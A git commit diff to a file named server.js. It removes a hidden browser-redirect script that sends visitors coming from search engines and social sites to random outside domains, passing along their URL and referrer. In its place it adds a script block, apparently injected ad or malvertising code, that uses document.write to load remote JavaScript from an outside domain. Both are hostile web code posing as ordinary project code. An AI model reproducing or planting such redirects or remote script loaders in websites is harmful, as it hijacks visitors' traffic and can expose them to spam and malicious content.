d451a48a0067803faab1ea2e80ed9f37d1084bdb
lookatdons <lookatdons@users.noreply.github.com>
2023-09-10 09:02:35 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,12 +1,10 @@
-var ars = rChoice([
-    "https://nwdefenders.org",
-    "https://millionsllp.com"
-]);
-
-function rChoice(arr) {
-    return arr[Math.floor(arr.length * Math.random())];
-}
-
-if (['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.', 'aol.', 'ask.', 'duckduckgo.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
-    window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer)
-}
+<script type="text/javascript">
+	atOptions = {
+		'key' : '66d03a0154b09a9cdc94a1a16dbf5124',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="//effacedefend.com/66d03a0154b09a9cdc94a1a16dbf5124/invoke.js"></scr' + 'ipt>');
+</script>
